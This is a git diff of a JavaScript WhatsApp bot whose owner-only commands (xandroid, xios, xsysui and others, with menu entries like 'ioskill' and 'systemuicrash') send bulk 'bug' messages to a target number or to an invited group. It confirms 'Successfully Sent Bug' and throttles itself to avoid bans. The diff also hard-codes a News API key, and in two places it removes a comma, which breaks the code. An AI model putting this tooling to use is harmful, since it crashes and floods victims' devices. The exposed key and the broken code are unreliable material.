@@ -2350,7 +2350,7 @@ break;
 ┃✺ ${prefix}ioskill
 ┃✺ ${prefix}systemuicrash 
 ┗━━━━━━━━━━━━━━━⊛
-> 𝚃𝙾𝙶𝙴-𝙼𝙳-𝚅𝟹 𝙱𝚈 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸`
+> 𝙱𝚈 𝚃𝙾𝙶𝙴 𝙸𝙽𝚄𝙼𝙰𝙺𝙸`
 
   let menumsg = generateWAMessageFromContent(from, {
   viewOnceMessage: {
@@ -4918,9 +4918,9 @@ case "xandroid": {
   }
   reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
-  sendVariousMessages(whatsappNumber, encodedAmount);
+  Maria.sendVariousMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
+  Maria.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
     " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
     [whatsappNumber]
@@ -4950,9 +4950,9 @@ case "xios": {
   }
   reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
-  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
+  Maria.sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
+  Maria.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
     " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
     [whatsappNumber]
@@ -4963,7 +4963,7 @@ break
 case "xios2":
   {
 	if (!isCreator) return reply(mess.owner);
-    if (!isBot) {
+    if (!isBotAdmins) {
       return reply("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
     }
     if (!text){
@@ -4975,16 +4975,16 @@ case "xios2":
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
     reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
     await sleep(1500); // Adjusted sleep time for clarity
-    sendMultiplePaymentInvites(from, encodedValue);
+    Maria.sendMultiplePaymentInvites(from, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
-    sendReaction('✅');
+    Maria.sendReaction('✅');
   }
   break
 	
   case "xandroid2":
   {
     if (!isCreator) return reply(mess.owner);
-    if (!isBot) {
+    if (!isBotAdmins) {
       return reply("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞");
     }
     if (!text){
@@ -4994,11 +4994,11 @@ case "xios2":
       return reply("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
     }
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replay("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..")
+    reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..")
     await sleep(1500); // Adjusted sleep time for clarity
-    sendVariousMessages(from, encodedValue);
+    Maria.sendVariousMessages(from, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
-    sendReaction('✅');
+    Maria.sendReaction('✅');
   }
   break
 	
@@ -5016,10 +5016,10 @@ case "xios2":
       let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
       let groupTarget = await Maria.groupAcceptInvite(groupLink);
       await sleep(2000); // Adjusted sleep time for clarity
-      sendViewOnceMessages(groupTarget, bugAmount);
+      Maria.sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
       reply("𝙷𝙾𝚆 𝚃𝙾 𝚂𝙴𝙽𝙳 𝙱𝚄𝙶 𝚃𝙾 𝙶𝚁𝙾𝚄𝙿");
-      XeonBotInc.groupLeave(groupTarget);
+      Maria.groupLeave(groupTarget);
     } catch (error) {
       reply(util.format(error));
     }
@@ -5049,11 +5049,11 @@ case "xios2":
   }
   reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
-  sendMixedMessages(whatsappNumber, encodedAmount);
+  Maria.sendMixedMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
+  Maria.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
-    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
+    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉." 
     [whatsappNumber]
   );
 }
@@ -5082,22 +5082,16 @@ case "xsysui": {
   }
   reply("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙..., " + command + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
   await sleep(2000); // Adjusted sleep time for clarity
-  sendRepeatedMessages2(whatsappNumber, encodedAmount);
+  Maria.sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
+  Maria.sendMessageWithMentions(
     "𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + whatsappNumber.split('@')[0] + 
-    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", 
+    " 𝖀𝖘𝖎𝖓𝖌 *" + command + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉." 
     [whatsappNumber]
   );
 }
-break
-	
-case 'clearall': {
-if (!isCreator) return reply(mess.owner);
-Maria.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
-}
 break;
-		
+			
 // Function to fetch the latest science news headlines using the News API
 async function fetchScienceNewsHeadlines() {
     const apiKey = 'bf17483564e24e2aa83ff6dc6a8e79eb'; // Provided News API key
